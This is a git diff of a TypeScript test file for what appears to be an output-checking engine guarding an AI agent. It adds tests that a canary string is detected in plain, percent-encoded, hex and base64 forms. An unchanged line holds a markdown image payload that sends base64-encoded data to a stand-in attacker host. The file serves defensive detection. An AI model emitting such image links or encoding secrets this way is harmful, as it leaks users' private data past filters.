@@ -1,6 +1,6 @@
 import { describe, expect, it } from "vitest";
 import { hashCanonical } from "./canonical.js";
-import { checkAction, checkCommit, checkContext, checkIntent, checkOutput } from "./engine.js";
+import { checkAction, checkCommit, checkContext, checkIntent, checkOutput, leaksCanary } from "./engine.js";
 import { lookalikeOf } from "./merchant.js";
 import { getDefaultBundle } from "./rules.js";
 import type { ContextItem, Mandate, ProposedAction } from "./schemas.js";
@@ -301,4 +301,21 @@ describe("checkOutput", () => {
     expect(checkOutput({ content: "![x](https://evil.example/p.png?d=c2VjcmV0LWRhdGEtaGVyZQ)" }).decision).toBe("REVIEW");
     expect(checkOutput({ content: "card 4111 1111 1111 1111" }).decision).toBe("REVIEW");
   });
+});
+
+describe("leaksCanary", () => {
+  const canary = "mwf-canary-0123abcd";
+  const pct = [...canary].map((c) => "%" + c.charCodeAt(0).toString(16)).join("");
+  const b = Buffer.from(canary);
+  const forms: [string, string][] = [
+    ["as written", "x=" + canary],
+    ["in another case", "x=" + canary.toUpperCase()],
+    ["percent-encoded", "x=" + pct],
+    ["percent-encoded twice", "x=" + encodeURIComponent(pct)],
+    ["as hex", "x=" + b.toString("hex")],
+    ["as base64", "x=" + b.toString("base64")],
+    ["as base64url", "x=" + b.toString("base64url")],
+  ];
+  for (const [name, text] of forms) it("finds it " + name, () => expect(leaksCanary(text, canary)).toBe(true));
+  it("does not fire on other text", () => expect(leaksCanary("https://shop-a.example/search?q=aa%20batteries", canary)).toBe(false));
 });
